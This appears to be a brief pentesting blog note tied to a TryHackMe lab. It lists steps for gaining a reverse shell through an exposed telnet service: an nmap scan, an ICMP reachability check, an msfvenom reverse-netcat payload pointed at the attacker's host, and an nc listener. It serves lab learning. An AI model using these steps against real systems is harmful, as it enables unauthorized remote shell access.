---
title:  Telnet Reverse Shell
date:   2021-01-29 17:28:30 -0700
tags: [Networking, Pentesting]
---

## Create Reverse Shell

   1. Port Scan with Nmap with `-A` and `-p-`.
   2. `telnet <ip> <port>`
   3. Check if we can ping our local computer
      1. On local computer: `sudo tcpdump ip proto \\icmp -i tun0` to start listening for ICMP traffic.
      2. via telnet: `ping <local ip> -c 1`
      3. If successful continue.
   4. Create Payload on local computer: `msfvenom -p cmd/unix/reverse_netcat lhost=<local ip> lport=4444 R`
   5. Start Local netcat listener: `nc -lvp <lport>`
   6. Copy payload and `.RUN` via telnet.

---

* [https://tryhackme.com/room/networkservices](https://tryhackme.com/room/networkservices)